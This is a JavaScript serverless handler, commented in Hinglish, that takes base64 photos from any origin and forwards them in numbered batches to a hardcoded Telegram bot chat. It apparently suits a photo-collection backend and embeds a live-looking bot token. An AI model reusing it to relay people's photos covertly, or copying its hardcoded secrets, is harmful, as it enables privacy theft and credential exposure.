// ⚠️⚠️⚠️ YAHAN APNA TOKEN AUR CHAT ID DAALEIN ⚠️⚠️⚠️
const BOT_TOKEN = '8802374981:AAGIspa4FHXBzwP6D1tOSo-r_sjd1blxWP8';   // ← @BotFather se mila token
const CHAT_ID = '8675573467';       // ← @userinfobot se mili ID

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { photo, filename, index, total } = req.body;

        if (!photo) {
            return res.status(400).json({ error: 'No photo provided' });
        }

        // Base64 se buffer
        const base64Data = photo.split(',')[1];
        const buffer = Buffer.from(base64Data, 'base64');

        // FormData create
        const FormData = globalThis.FormData;
        const formData = new FormData();
        
        // Buffer ko Blob mein convert
        const blob = new Blob([buffer], { type: 'image/jpeg' });
        
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, filename || `photo_${index}.jpg`);
        formData.append('caption', `📸 Photo ${index}/${total}${filename ? '\n📁 ' + filename : ''}`);

        // Telegram API call
        const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        const result = await response.json();

        if (!result.ok) {
            console.error('Telegram API Error:', result);
            return res.status(500).json({ 
                success: false, 
                error: result.description || 'Telegram API error' 
            });
        }

        return res.status(200).json({ 
            success: true, 
            message_id: result.result.message_id 
        });

    } catch (error) {
        console.error('Handler error:', error);
        return res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}